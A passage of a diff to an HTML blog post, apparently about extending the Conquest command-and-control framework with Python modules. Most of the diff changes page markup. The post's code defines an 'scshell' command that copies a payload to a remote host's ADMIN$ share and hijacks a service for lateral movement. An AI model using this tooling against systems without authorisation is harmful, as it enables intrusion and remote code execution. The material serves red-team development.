@@ -65,6 +65,11 @@
             document.documentElement.setAttribute("data-theme", "light");
         }
     </script>
+
+    <script defer src="/js/toc.js" integrity=""></script>
+
+
+
 <script defer src="/js/header.js" integrity=""></script>
 
 
@@ -224,7 +229,7 @@
     
     <span class="date">March 13, 2026</span>
     
-    
+
     
     <span> • </span>
      
@@ -243,12 +248,13 @@
     
 </div>
 
-
-
-
-<details class="collapsible-menu-wrapper"><summary class="collapsible-menu-type"><span>Table of contents</span></summary><div class="collapsible-menu">
-        
-            <nav id="TableOfContents">
+<details class="toc-mobile">
+    <summary class="toc-mobile-summary">
+        <span class="toc-mobile-label">Contents</span>
+        <span class="toc-mobile-chevron"></span>
+    </summary>
+    <div class="toc-mobile-body">
+        <nav id="TableOfContentsMobile">
   <ul>
     <li><a href="#the-bare-minimum">The Bare Minimum</a></li>
     <li><a href="#post-exploitation-using-beacon-object-files">Post-Exploitation using Beacon Object Files</a></li>
@@ -264,18 +270,18 @@
     <li><a href="#conclusion">Conclusion</a></li>
   </ul>
 </nav>
-        
-    </div></details>
+    </div>
+</details>
+<div class="post-layout">
+    <div class="post-body">
+        <div class="blog-body">
 
+            
+                <h2 class="blog-introduction-header" id="introduction">Introduction</h2>
+            
 
-<div class="blog-body">
-
-    
-        <h2 class="blog-introduction-header" id="introduction">Introduction</h2>
-      
-    
-    
-    <div class="content-margin">
+            
+            <div class="content-margin">
 
 
 
@@ -290,15 +296,9 @@
 
 
 
-
-
-
 <figure class="">
-    <div>
-        <img loading="lazy" alt="Conquest Python Module" src=" /img/c2-module-system/1.png">
-    </div>
-    
-</figure></p>
+    <img loading="lazy" alt="Conquest Python Module" src="/img/c2-module-system/1.png"></figure>
+</p>
 
 <h2 id="the-bare-minimum" class="header-anchor-wrapper">The Bare Minimum
   <a href="#the-bare-minimum" class="header-anchor-link">
@@ -323,15 +323,9 @@
 
 
 
-
-
-
 <figure class="">
-    <div>
-        <img loading="lazy" alt="Conquest Core Modules" src=" /img/c2-module-system/0.png">
-    </div>
-    
-</figure></p>
+    <img loading="lazy" alt="Conquest Core Modules" src="/img/c2-module-system/0.png"><figcaption>Conquest Core Modules</figcaption></figure>
+</p>
 
 <h2 id="post-exploitation-using-beacon-object-files" class="header-anchor-wrapper">Post-Exploitation using Beacon Object Files
   <a href="#post-exploitation-using-beacon-object-files" class="header-anchor-link">
@@ -389,17 +383,8 @@
 
 
 
-
-
-
 <figure class=" img-dark">
-    <div>
-        <img loading="lazy" alt="Module System Architecture" src=" /img/c2-module-system/arch-dark.png#dark">
-    </div>
-    
-</figure>
-
-
+    <img loading="lazy" alt="Module System Architecture" src="/img/c2-module-system/arch-dark.png#dark"><figcaption>Conquest Module System Architecture</figcaption></figure>
 
 
 
@@ -412,11 +397,8 @@
 
 
 <figure class=" img-light">
-    <div>
-        <img loading="lazy" alt="Module System Architecture" src=" /img/c2-module-system/arch-light.png#light">
-    </div>
-    
-</figure></p>
+    <img loading="lazy" alt="Module System Architecture" src="/img/c2-module-system/arch-light.png#light"><figcaption>Conquest Module System Architecture</figcaption></figure>
+</p>
 
 <h2 id="creating-commands" class="header-anchor-wrapper">Creating Commands
   <a href="#creating-commands" class="header-anchor-link">
@@ -441,17 +423,17 @@
 <li><em>Command registration</em>: Command needs to be registered to a command group or optionally a module.</li>
 </ol>
 <p>Every Conquest module starts with the imports at the top. The <code>conquest</code> module is required to access the Python API, but any other standard Python libraries can be added as well.</p>
-<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;" class="mc-table"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
+<div class="code-block"><div class="highlight"><div class="chroma">
+<table class="lntable" class="mc-table"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
 </span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> conquest
-</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> os.path
-</span></span></code></pre></td></tr></table>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">conquest</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os.path</span></span></span></code></pre></td></tr></table>
 </div>
-</div>
+</div></div>
+
 <h3 id="command-definition" class="header-anchor-wrapper">Command Definition
   <a href="#command-definition" class="header-anchor-link">
     <svg width="16px" height="16px" viewBox="0 0 24 24">
@@ -505,25 +487,27 @@
   </tbody>
 </table>
 <p>This blog post takes the <code>scshell</code> command as an example, which wraps a variation of the <a href="https://github.com/Mr-Un1k0d3r/SCShell">SCShell</a> BOF. This technique enables lateral movement via SMB without the need for creating a service on the target system.</p>
-<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;" class="mc-table"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">8
+<div class="code-block"><div class="highlight"><div class="chroma">
+<table class="lntable" class="mc-table"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
 </span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>cmd_scshell = (
-</span></span><span style="display:flex;"><span>    conquest.createCommand(name=<span style="color:#0ff;font-weight:bold">&#34;scshell&#34;</span>, 
-</span></span><span style="display:flex;"><span>                           description=<span style="color:#0ff;font-weight:bold">&#34;Perform fileless lateral movement by modifying an existing remote service&#39;s binary path (SCShell tool).&#34;</span>, 
-</span></span><span style="display:flex;"><span>                           example=<span style="color:#0ff;font-weight:bold">&#34;scshell dc01 bin/monarch.smb_x64.svc.exe --service Spooler --name update.exe&#34;</span>,
-</span></span><span style="display:flex;"><span>                           message=<span style="color:#0ff;font-weight:bold">&#34;Tasked agent to perform fileless lateral movement via SCShell.&#34;</span>, 
-</span></span><span style="display:flex;"><span>                           mitre=[<span style="color:#0ff;font-weight:bold">&#34;T1021.002&#34;</span>])
-</span></span></code></pre></td></tr></table>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">cmd_scshell</span> <span class="o">=</span> <span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="n">conquest</span><span class="o">.</span><span class="n">createCommand</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="s2">&#34;scshell&#34;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">                           <span class="n">description</span><span class="o">=</span><span class="s2">&#34;Perform fileless lateral movement by modifying an existing remote service&#39;s binary path (SCShell tool).&#34;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">                           <span class="n">example</span><span class="o">=</span><span class="s2">&#34;scshell dc01 bin/monarch.smb_x64.svc.exe --service Spooler --name update.exe&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                           <span class="n">message</span><span class="o">=</span><span class="s2">&#34;Tasked agent to perform fileless lateral movement via SCShell.&#34;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">                           <span class="n">mitre</span><span class="o">=</span><span class="p">[</span><span class="s2">&#34;T1021.002&#34;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">                           </span></span></code></pre></td></tr></table>
 </div>
-</div>
+</div></div>
+
 <h3 id="command-arguments" class="header-anchor-wrapper">Command Arguments
   <a href="#command-arguments" class="header-anchor-link">
     <svg width="16px" height="16px" viewBox="0 0 24 24">
@@ -582,23 +566,23 @@
   </tbody>
 </table>
 <p>In the case of <code>scshell</code>, the following arguments are supported.</p>
-<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;" class="mc-table"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
+<div class="code-block"><div class="highlight"><div class="chroma">
+<table class="lntable" class="mc-table"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
 </span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>.addArgString(<span style="color:#0ff;font-weight:bold">&#34;target&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;Target system hostname or IP address.&#34;</span>, <span style="color:#fff;font-weight:bold">True</span>)
-</span></span><span style="display:flex;"><span>.addArgFile(<span style="color:#0ff;font-weight:bold">&#34;payload&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;Path to payload to execute on the target.&#34;</span>, <span style="color:#fff;font-weight:bold">True</span>)
-</span></span><span style="display:flex;"><span>.addFlagString(<span style="color:#0ff;font-weight:bold">&#34;--service&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;service&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;Target service (default: defragsvc).&#34;</span>, <span style="color:#fff;font-weight:bold">False</span>, <span style="color:#0ff;font-weight:bold">&#34;defragsvc&#34;</span>)
-</span></span><span style="display:flex;"><span>.addFlagString(<span style="color:#0ff;font-weight:bold">&#34;--name&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;name&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;Target service name (default: Name of the target service).&#34;</span>)
-</span></span><span style="display:flex;"><span>.addFlagString(<span style="color:#0ff;font-weight:bold">&#34;--share&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;share&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;Share for copying payload (default: ADMIN$).&#34;</span>, <span style="color:#fff;font-weight:bold">False</span>, <span style="color:#0ff;font-weight:bold">&#34;ADMIN$&#34;</span>)
-</span></span></code></pre></td></tr></table>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">.</span><span class="n">addArgString</span><span class="p">(</span><span class="s2">&#34;target&#34;</span><span class="p">,</span> <span class="s2">&#34;Target system hostname or IP address.&#34;</span><span class="p">,</span> <span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">.</span><span class="n">addArgFile</span><span class="p">(</span><span class="s2">&#34;payload&#34;</span><span class="p">,</span> <span class="s2">&#34;Path to payload to execute on the target.&#34;</span><span class="p">,</span> <span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">.</span><span class="n">addFlagString</span><span class="p">(</span><span class="s2">&#34;--service&#34;</span><span class="p">,</span> <span class="s2">&#34;service&#34;</span><span class="p">,</span> <span class="s2">&#34;Target service (default: defragsvc).&#34;</span><span class="p">,</span> <span class="kc">False</span><span class="p">,</span> <span class="s2">&#34;defragsvc&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">.</span><span class="n">addFlagString</span><span class="p">(</span><span class="s2">&#34;--name&#34;</span><span class="p">,</span> <span class="s2">&#34;name&#34;</span><span class="p">,</span> <span class="s2">&#34;Target service name (default: Name of the target service).&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">.</span><span class="n">addFlagString</span><span class="p">(</span><span class="s2">&#34;--share&#34;</span><span class="p">,</span> <span class="s2">&#34;share&#34;</span><span class="p">,</span> <span class="s2">&#34;Share for copying payload (default: ADMIN$).&#34;</span><span class="p">,</span> <span class="kc">False</span><span class="p">,</span> <span class="s2">&#34;ADMIN$&#34;</span><span class="p">)</span></span></span></code></pre></td></tr></table>
 </div>
-</div>
+</div></div>
+
 <h3 id="command-handler" class="header-anchor-wrapper">Command Handler
   <a href="#command-handler" class="header-anchor-link">
     <svg width="16px" height="16px" viewBox="0 0 24 24">
@@ -642,33 +626,33 @@
   </tbody>
 </table>
 <p>Within the handler, Conquest&rsquo;s Python API provides a set of <code>get_&lt;type&gt;</code> functions to extract individual arguments from the args list by index, in the same order they were defined on the command. This step also allows for additional validation and preprocessing. For instance, this includes handling mutually exclusive flags or converting string options to integer values before passing them to the BOF.</p>
-<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;" class="mc-table"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
+<div class="code-block"><div class="highlight"><div class="chroma">
+<table class="lntable" class="mc-table"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
 </span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">def</span> _scshell(agentId, cmdline, args): 
-</span></span><span style="display:flex;"><span>    target = conquest.get_string(args, <span style="color:#ff0;font-weight:bold">0</span>)
-</span></span><span style="display:flex;"><span>    payloadName, payloadBytes = conquest.get_file(args, <span style="color:#ff0;font-weight:bold">1</span>)
-</span></span><span style="display:flex;"><span>    service = conquest.get_string(args, <span style="color:#ff0;font-weight:bold">2</span>)
-</span></span><span style="display:flex;"><span>    name = conquest.get_string(args, <span style="color:#ff0;font-weight:bold">3</span>)
-</span></span><span style="display:flex;"><span>    share = conquest.get_string(args, <span style="color:#ff0;font-weight:bold">4</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#007f7f"># Format path</span>
-</span></span><span style="display:flex;"><span>    path = <span style="color:#0ff;font-weight:bold">f</span><span style="color:#0ff;font-weight:bold">&#34;</span><span style="color:#0ff;font-weight:bold">\\\\</span><span style="color:#0ff;font-weight:bold">{</span>target<span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold">\\</span><span style="color:#0ff;font-weight:bold">{</span>share<span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold">\\</span><span style="color:#0ff;font-weight:bold">{</span>name <span style="color:#fff;font-weight:bold">if</span> name <span style="color:#fff;font-weight:bold">else</span> service<span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold">&#34;</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> not path.endswith(<span style="color:#0ff;font-weight:bold">&#34;.exe&#34;</span>): path += <span style="color:#0ff;font-weight:bold">&#34;.exe&#34;</span>
-</span></span></code></pre></td></tr></table>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">_scshell</span><span class="p">(</span><span class="n">agentId</span><span class="p">,</span> <span class="n">cmdline</span><span class="p">,</span> <span class="n">args</span><span class="p">):</span> 
+</span></span><span class="line"><span class="cl">    <span class="n">target</span> <span class="o">=</span> <span class="n">conquest</span><span class="o">.</span><span class="n">get_string</span><span class="p">(</span><span class="n">args</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payloadName</span><span class="p">,</span> <span class="n">payloadBytes</span> <span class="o">=</span> <span class="n">conquest</span><span class="o">.</span><span class="n">get_file</span><span class="p">(</span><span class="n">args</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">service</span> <span class="o">=</span> <span class="n">conquest</span><span class="o">.</span><span class="n">get_string</span><span class="p">(</span><span class="n">args</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">name</span> <span class="o">=</span> <span class="n">conquest</span><span class="o">.</span><span class="n">get_string</span><span class="p">(</span><span class="n">args</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">share</span> <span class="o">=</span> <span class="n">conquest</span><span class="o">.</span><span class="n">get_string</span><span class="p">(</span><span class="n">args</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># Format path</span>
+</span></span><span class="line"><span class="cl">    <span class="n">path</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="se">\\\\</span><span class="si">{</span><span class="n">target</span><span class="si">}</span><span class="se">\\</span><span class="si">{</span><span class="n">share</span><span class="si">}</span><span class="se">\\</span><span class="si">{</span><span class="n">name</span> <span class="k">if</span> <span class="n">name</span> <span class="k">else</span> <span class="n">service</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">path</span><span class="o">.</span><span class="n">endswith</span><span class="p">(</span><span class="s2">&#34;.exe&#34;</span><span class="p">):</span> <span class="n">path</span> <span class="o">+=</span> <span class="s2">&#34;.exe&#34;</span></span></span></code></pre></td></tr></table>
 </div>
-</div><p>The <code>bof_pack</code> function constructs the hex-encoded argument string passed to the BOF, modeled after the identically named function in Cobalt Strike&rsquo;s Aggressor Script. It takes a format string where each character represents the type of one argument, followed by the arguments themselves, and returns a hex string prefixed with the total data length.</p>
+</div></div>
+<p>The <code>bof_pack</code> function constructs the hex-encoded argument string passed to the BOF, modeled after the identically named function in Cobalt Strike&rsquo;s Aggressor Script. It takes a format string where each character represents the type of one argument, followed by the arguments themselves, and returns a hex string prefixed with the total data length.</p>
 <table class="mc-table">
   <thead>
       <tr>
@@ -713,86 +697,54 @@
 
 
 
-
-
-
 <figure class="">
-    <div>
-        <img loading="lazy" alt="SCShell BOF entry point" src=" /img/c2-module-system/3.png">
-    </div>
-    
-</figure>
-
-
-
-
-
-    
-
-
-<div class="color-block content-margin color-block-caption">
-
-    
-<svg
-    xmlns="http://www.w3.org/2000/svg"
-    width="24" height="24" viewBox="0 0 24 24" fill="none"
-    stroke="currentColor" stroke-width="2" stroke-linecap="round"
-    stroke-linejoin="round">
-    <polyline points="17 11 12 6 7 11"></polyline><polyline points="17 18 12 13 7 18"></polyline>
-</svg>
-
-
-
-    <div class="color-block-content">
-        Entry point of the <code>scshell</code> BOF.
-    </div>
-</div>
+    <img loading="lazy" alt="SCShell BOF entry point" src="/img/c2-module-system/3.png"><figcaption>Entry point of the `scshell` BOF.</figcaption></figure>
 </p>
-<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;" class="mc-table"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
+<div class="code-block"><div class="highlight"><div class="chroma">
+<table class="lntable" class="mc-table"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
 </span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>    bof = conquest.modules_root() + <span style="color:#0ff;font-weight:bold">&#34;/lateral-movement/scshell/scshell.x64.o&#34;</span>
-</span></span><span style="display:flex;"><span>    params = conquest.bof_pack(<span style="color:#0ff;font-weight:bold">&#34;zzzb&#34;</span>, [
-</span></span><span style="display:flex;"><span>        target,         <span style="color:#007f7f"># z: Target system</span>
-</span></span><span style="display:flex;"><span>        service,        <span style="color:#007f7f"># z: Target service</span>
-</span></span><span style="display:flex;"><span>        path,           <span style="color:#007f7f"># z: Payload path</span>
-</span></span><span style="display:flex;"><span>        payloadBytes,   <span style="color:#007f7f"># b: Payload bytes         </span>
-</span></span><span style="display:flex;"><span>    ])
-</span></span></code></pre></td></tr></table>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">    <span class="n">bof</span> <span class="o">=</span> <span class="n">conquest</span><span class="o">.</span><span class="n">modules_root</span><span class="p">()</span> <span class="o">+</span> <span class="s2">&#34;/lateral-movement/scshell/scshell.x64.o&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">params</span> <span class="o">=</span> <span class="n">conquest</span><span class="o">.</span><span class="n">bof_pack</span><span class="p">(</span><span class="s2">&#34;zzzb&#34;</span><span class="p">,</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">        <span class="n">target</span><span class="p">,</span>         <span class="c1"># z: Target system</span>
+</span></span><span class="line"><span class="cl">        <span class="n">service</span><span class="p">,</span>        <span class="c1"># z: Target service</span>
+</span></span><span class="line"><span class="cl">        <span class="n">path</span><span class="p">,</span>           <span class="c1"># z: Payload path</span>
+</span></span><span class="line"><span class="cl">        <span class="n">payloadBytes</span><span class="p">,</span>   <span class="c1"># b: Payload bytes         </span>
+</span></span><span class="line"><span class="cl">    <span class="p">])</span></span></span></code></pre></td></tr></table>
 </div>
-</div><p>Finally, the <code>bof</code> command is executed as an alias with the hex string as the argument.</p>
-<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;" class="mc-table"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22
+</div></div>
+<p>Finally, the <code>bof</code> command is executed as an alias with the hex string as the argument.</p>
+<div class="code-block"><div class="highlight"><div class="chroma">
+<table class="lntable" class="mc-table"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
 </span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> os.path.exists(bof):
-</span></span><span style="display:flex;"><span>        conquest.execute_alias(agentId, cmdline, <span style="color:#0ff;font-weight:bold">f</span><span style="color:#0ff;font-weight:bold">&#34;bof </span><span style="color:#0ff;font-weight:bold">{</span>bof<span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold"> </span><span style="color:#0ff;font-weight:bold">{</span>params<span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold">&#34;</span>)
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">else</span>:
-</span></span><span style="display:flex;"><span>        conquest.error(agentId, cmdline, <span style="color:#0ff;font-weight:bold">f</span><span style="color:#0ff;font-weight:bold">&#34;Failed to open object file: </span><span style="color:#0ff;font-weight:bold">{</span>bof<span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold">&#34;</span>)
-</span></span></code></pre></td></tr></table>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">bof</span><span class="p">):</span>
